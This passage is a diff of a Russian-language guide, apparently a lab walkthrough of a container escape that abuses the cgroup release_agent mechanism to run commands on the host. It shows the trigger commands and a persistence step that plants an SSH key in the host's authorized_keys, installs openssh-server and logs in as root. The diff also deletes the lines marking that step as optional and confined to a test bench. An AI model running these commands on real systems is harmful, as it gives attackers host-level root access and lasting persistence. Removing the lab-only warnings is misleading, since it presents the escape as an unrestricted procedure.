@@ -982,9 +982,9 @@ chmod a+x /cmd
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 cat output
 ```
-(Опционально) Шаг 8 — Демонстрация персистентности (не выполнять вне стенда)
+Шаг 8 — Демонстрация персистентности.
 Сформировать ключи SSH в контейнере, безопасно извлечь публичный ключ.
-Через механизм release agent в учебной среде записать ключ в authorized_keys на хосте.
+Через механизм release agent записать ключ в authorized_keys на хосте.
 Проверить подключение по SSH.
 
 ```bash
@@ -1000,7 +1000,7 @@ echo "apt-get install openssh-server -y > $host_path/output" >> /cmd
 chmod a+x /cmd
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
-log
+
 ```bash
 ssh root@192.168.0.97
 The authenticity of host '192.168.0.97 (192.168.0.97)' can't be established.
